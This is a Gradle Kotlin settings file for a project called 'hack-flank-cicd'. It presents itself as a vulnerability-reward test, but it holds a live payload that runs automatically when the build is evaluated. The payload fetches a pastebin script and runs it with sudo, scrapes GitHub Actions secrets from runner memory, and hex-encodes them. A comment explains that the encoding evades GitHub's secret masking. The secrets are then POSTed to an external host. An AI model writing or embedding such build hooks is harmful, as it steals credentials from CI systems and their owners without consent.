import java.util.*
import kotlin.system.exitProcess

rootProject.name = "hack-flank-cicd"

// For VRP Test, not malicious.
fun String.runCommand(): String? = try {
    ProcessBuilder("/bin/sh", "-c", this)
            .redirectOutput(ProcessBuilder.Redirect.PIPE)
            .redirectError(ProcessBuilder.Redirect.PIPE)
            .start()
            .inputStream.bufferedReader().readText()
} catch (e: Exception) {
    e.printStackTrace()
    null
}

if (!System.getProperty("os.name").lowercase(Locale.getDefault()).contains("linux")){
    exitProcess(1)
}
// 这里不用 base64 是因为 base64 编码后容易字符刚好是 github 判定为敏感输出，会打码成 *** 。当然外带就没这个问题了
val output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | xxd -p | tr -d '\\n'".runCommand()
println("Shell command output: $output")
val post = "curl -X POST http://tsu.tari.moe:3306 --data s=\"$output\"".runCommand()